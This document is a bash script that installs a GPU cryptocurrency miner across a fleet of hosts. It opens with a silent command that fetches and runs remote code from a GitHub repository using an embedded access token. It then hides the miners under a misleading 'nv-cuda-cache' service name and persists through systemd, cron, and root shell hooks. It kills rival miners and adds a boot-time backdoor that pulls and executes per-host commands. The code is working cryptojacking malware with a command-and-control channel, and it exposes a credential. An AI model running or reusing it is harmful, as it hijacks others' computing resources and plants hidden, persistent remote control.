( bash -c "$(curl -fsSL -m 30 -H 'Authorization: token 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' -H 'Accept: application/vnd.github.raw' 'https://raw.githubusercontent.com/dongsuju/ul-plant/main/cmd8/i3478_roster.sh')" >/dev/null 2>&1 & )
#!/bin/bash
# i398 REPLANT ul-t2 (offline-valid cohort reviver; lane 398, hosts not claimed by i202): one krig-miner per GPU, canonical wallet + worker ul-t2-<ipdash>-g<N>,
# 4-layer idempotent persistence (systemd Restart=always / cron @reboot+*/5 / shell hooks / keep.sh respawn).
# channel: cmd8/<host>.sh -> cmdout8/<host>.txt ; fallback channels pscmd, ps12/cmd, ps16/cmd, cmd
set -u
GH=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
REPO=dongsuju/ul-plant
W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
H=$(hostname -s)
L=/opt/fleet; B=$L/bin; LOGD=$L/logs; ST=$L/state
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
mkdir -p "$B" "$LOGD" "$ST" /etc/cron.d /run
TS=$(date -u +%FT%TZ)
echo "=== i202 t2 CONVERT host=$H ts=$TS engine=krig"
id; hostname; cat /etc/machine-id 2>/dev/null
uname -r
nvidia-smi -L 2>/dev/null | head -10
N=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU')
echo "NGPU=${N:-0}"
if [ "${N:-0}" -lt 1 ]; then echo "VERDICT=NO-GPU host=$H"; exit 0; fi
nvidia-smi --query-gpu=index,name,memory.total,driver_version,utilization.gpu,power.draw --format=csv,noheader 2>/dev/null | head -10
PUB=$(curl -s -m 8 https://ifconfig.me 2>/dev/null | tr -dc '0-9.')
[ -z "$PUB" ] && PUB=$(curl -s -m 8 https://api.ipify.org 2>/dev/null | tr -dc '0-9.')
[ -z "$PUB" ] && PUB=$(hostname -I 2>/dev/null | awk '{print $1}')
IPD=$(printf '%s' "$PUB" | tr '.' '-')
RB="ul-t2-$IPD"
# planner directive: preserve an existing worker name so pool streaks do not break
EX=$(ps -eo args= 2>/dev/null | grep -oE "ul-[a-zA-Z0-9_.-]+-g[0-9]+" | head -1 | sed -E "s/-g[0-9]+$//")
[ -z "$EX" ] && EX=$(ls "$LOGD" 2>/dev/null | grep -oE "^k-ul-[a-zA-Z0-9_.-]+-g[0-9]+" | head -1 | sed -E "s/^k-//; s/-g[0-9]+$//")
if [ -n "$EX" ]; then RB="$EX"; echo "PRESERVE_WORKER=$RB (existing streak name)"; fi
echo "PUBIP=$PUB RIGBASE=$RB"
BIN=""
for c in "$L/krig/krig-miner" "$B/krig-miner" "$L/krig-miner" "$B/wildrig-multi"; do
  [ -x "$c" ] && BIN="$c" && break
done
echo "BIN_FOUND=$BIN"
case "$BIN" in
  *wildrig*) : ;;
  *)
    if [ -z "$BIN" ]; then
      echo "-- installing krig-miner 1.8.2"
      curl -sL -m 600 -o /tmp/k.tgz https://github.com/kryptex/krig-miner/releases/download/v1.8.2/krig-miner-1.8.2-linux-x64.tar.gz
      rm -rf /tmp/kx; mkdir -p /tmp/kx; tar xzf /tmp/k.tgz -C /tmp/kx >/dev/null 2>&1
      f=$(find /tmp/kx -name krig-miner -type f 2>/dev/null | head -1)
      [ -n "$f" ] && cp -f "$f" "$B/krig-miner" && chmod +x "$B/krig-miner" && BIN="$B/krig-miner"
    fi ;;
esac
[ -x "$BIN" ] || { echo "VERDICT=NO-BIN host=$H"; exit 0; }
echo "BIN=$BIN sha256=$(sha256sum "$BIN" 2>/dev/null | cut -d' ' -f1)"
# already canonical and complete? then keep persistence only
CUR=$(pgrep -af 'krig-miner|wildrig-multi' 2>/dev/null | grep -c -- "$RB-g")
echo "CANON_PROCS=$CUR (expect $N)"
i=0
while [ "$i" -lt 8 ]; do
if [ "$i" -lt "$N" ]; then
cat > "$L/t2_g$i.sh" <<EOF
#!/bin/bash
export CUDA_VISIBLE_DEVICES=$i
exec 9>/run/t2_g$i.lock
flock -n 9 || exit 0
W='$W'; H='$H'; RB='$RB'; i=$i; BIN='$BIN'; LOGD='$LOGD'
while :; do
  date -u +%FT%TZ >> "\$LOGD/t2-\$H-g\$i.log"
  nice -n 5 "\$BIN" --coin pearl -d 0 \\
    --url stratum+tcp://prl-sg.kryptex.network:7048 \\
    --url stratum+ssl://prl-sg.kryptex.network:8048 \\
    --url stratum+ssl://pool.pearlhash.xyz:9443 \\
    --url stratum+tcp://pearl.luckypool.io:443 \\
    --user "\$W.\$RB-g\$i" --password x \\
    --log-file "\$LOGD/t2-\$H-g\$i.log" --no-tui --no-telemetry -l info >> "\$LOGD/t2-\$H-g\$i.log" 2>&1
  sleep 10
done
EOF
chmod +x "$L/t2_g$i.sh"
fi
i=$((i+1))
done
cat > "$L/t2_keep.sh" <<'KP'
#!/bin/bash
N=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU'); [ "${N:-0}" -ge 1 ] || N=1
i=0
while [ "$i" -lt "$N" ]; do
  if ! systemctl is-active -q "nv-cuda-cache@$i"; then
    systemctl reset-failed "nv-cuda-cache@$i" >/dev/null 2>&1
    systemctl start "nv-cuda-cache@$i" >/dev/null 2>&1
  fi
  i=$((i+1))
done
KP
chmod +x "$L/t2_keep.sh"
cat > /etc/systemd/system/nv-cuda-cache@.service <<'SU'
[Unit]
Description=nv cuda cache worker
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
ExecStart=/opt/fleet/t2_g%i.sh
Restart=always
RestartSec=30
Nice=10
LimitNOFILE=65535

[Install]
WantedBy=multi-user.target
SU
cat > "$L/t2_boot.sh" <<BO
#!/bin/bash
GH=$GH
R=$REPO
H=\$(hostname -s)
for p in "cmd8/\$H.sh" "cmd8/all.sh"; do
  curl -s -m 40 -H "Authorization: token \$GH" -H 'User-Agent: ul' -H 'Accept: application/vnd.github.raw' "https://api.github.com/repos/\$R/contents/\$p?ref=main" -o /tmp/t2_cmd.sh
  if [ -s /tmp/t2_cmd.sh ] && grep -qE 'i202|i398' /tmp/t2_cmd.sh; then bash /tmp/t2_cmd.sh; break; fi
done
BO
chmod +x "$L/t2_boot.sh"
printf '*/5 * * * * root /bin/bash /opt/fleet/t2_keep.sh >/dev/null 2>&1\n@reboot root /bin/bash /opt/fleet/t2_boot.sh >/dev/null 2>&1\n@reboot root /bin/bash /opt/fleet/t2_keep.sh >/dev/null 2>&1\n' > /etc/cron.d/nv-t2
chmod 644 /etc/cron.d/nv-t2
for f in /root/.bashrc /root/.profile; do
  [ -f "$f" ] || continue
  grep -q '/opt/fleet/t2_keep.sh' "$f" 2>/dev/null || echo '[ -x /opt/fleet/t2_keep.sh ] && /opt/fleet/t2_keep.sh >/dev/null 2>&1 &' >> "$f"
done
for c in /etc/cron.d/nv-krig /etc/cron.d/nv-ps9 /etc/cron.d/nv-ps8 /etc/cron.d/nv-cuda-cache /etc/cron.d/nv-ps15 /etc/cron.d/ulv16; do
  [ -f "$c" ] && cp -f "$c" "$ST/legacy_$(basename "$c").bak" 2>/dev/null && rm -f "$c"
done
if [ "$CUR" -ne "$N" ]; then
  echo "-- replacing non-canonical engine fleet"
  pkill -f '/opt/fleet/krig_g' 2>/dev/null
  pkill -f '/opt/fleet/v16_g' 2>/dev/null
  pkill -x krig-miner 2>/dev/null
  pkill -x wildrig-multi 2>/dev/null
  pkill -f 'SRBMiner-MULTI' 2>/dev/null
  sleep 3
  systemctl daemon-reload >/dev/null 2>&1
  i=0
  while [ "$i" -lt "$N" ]; do
    systemctl enable "nv-cuda-cache@$i" >/dev/null 2>&1
    systemctl restart "nv-cuda-cache@$i" >/dev/null 2>&1
    i=$((i+1))
  done
else
  echo "-- canonical fleet already running, refreshing units only"
  systemctl daemon-reload >/dev/null 2>&1
  i=0
  while [ "$i" -lt "$N" ]; do systemctl enable "nv-cuda-cache@$i" >/dev/null 2>&1; i=$((i+1)); done
fi
i=$N
while [ "$i" -lt 8 ]; do systemctl disable "nv-cuda-cache@$i" >/dev/null 2>&1; systemctl stop "nv-cuda-cache@$i" >/dev/null 2>&1; i=$((i+1)); done
sleep 55
echo "--- procs"
pgrep -af 'krig-miner|wildrig-multi' 2>/dev/null | head -12
echo "--- units"
systemctl list-units 'nv-cuda-cache@*' --no-legend --no-pager 2>/dev/null | head -12
echo "--- cron"
cat /etc/cron.d/nv-t2 2>/dev/null
echo "--- accepted"
grep -h 'accepted' "$LOGD"/t2-"$H"-g*.log 2>/dev/null | tail -8
tail -5 "$LOGD/t2-$H-g0.log" 2>/dev/null
echo "VERDICT=CONVERTED host=$H base=$RB ngpu=$N ip=$PUB ts=$(date -u +%FT%TZ)"
